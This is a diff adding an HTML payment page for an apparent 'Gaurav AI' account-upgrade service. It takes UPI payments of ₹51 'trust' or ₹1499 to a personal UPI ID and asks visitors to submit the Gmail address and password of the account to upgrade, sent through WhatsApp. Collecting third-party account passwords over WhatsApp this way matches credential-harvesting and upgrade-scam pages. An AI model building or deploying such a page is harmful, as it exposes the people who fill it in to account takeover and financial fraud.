@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Payment - Gaurav AI</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+    <div class="background-blobs">
+        <div class="blob blob-1"></div>
+        <div class="blob blob-2"></div>
+    </div>
+
+    <div class="payment-wrapper">
+        <div class="glass-card payment-card">
+            <a href="index.html" class="back-link"><i class="fa-solid fa-arrow-left"></i> Back to Home</a>
+            
+            <h2>Complete Your Order</h2>
+            <p class="sub-text">1. Select Amount & Scan QR<br>2. Enter Details & Submit</p>
+
+            <!-- Toggle Switch for Amount -->
+            <div class="amount-toggle">
+                <button class="toggle-btn" id="btn-51" onclick="setAmount(51)">₹51 (Trust)</button>
+                <button class="toggle-btn" id="btn-1499" onclick="setAmount(1499)">₹1499 (Full)</button>
+            </div>
+
+            <!-- QR Code Area -->
+            <div class="qr-section">
+                <div class="qr-frame">
+                    <!-- QR Code generates automatically via JS -->
+                    <img id="dynamicQR" src="" alt="Payment QR">
+                </div>
+                <div class="scan-text">Scan to pay <span id="displayAmount" class="highlight">₹51</span></div>
+                <div class="upi-id">UPI: <span class="copy-text">sauravvarmag8@oksbi</span></div>
+            </div>
+
+            <!-- User Details Form -->
+            <form id="detailsForm" onsubmit="sendToWhatsApp(event)">
+                <div class="form-group">
+                    <label>Your WhatsApp Number</label>
+                    <input type="text" id="userPhone" placeholder="+91 XXXXX XXXXX" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Your Gmail (For Updates)</label>
+                    <input type="email" id="userEmail" placeholder="yourname@gmail.com" required>
+                </div>
+
+                <div class="divider"><span>Account To Upgrade</span></div>
+
+                <div class="form-group">
+                    <label>Account Gmail</label>
+                    <input type="email" id="accountEmail" placeholder="email@to-upgrade.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Account Password</label>
+                    <input type="text" id="accountPass" placeholder="Password for setup" required>
+                </div>
+
+                <button type="submit" class="pay-btn primary-btn">
+                    <i class="fa-brands fa-whatsapp"></i> Submit Details on WhatsApp
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        // Check URL for amount parameter (to auto-select based on previous click)
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const amount = urlParams.get('amount');
+            if(amount === '1499') {
+                setAmount(1499);
+            } else {
+                setAmount(51);
+            }
+        };
+    </script>
+</body>
+</html>
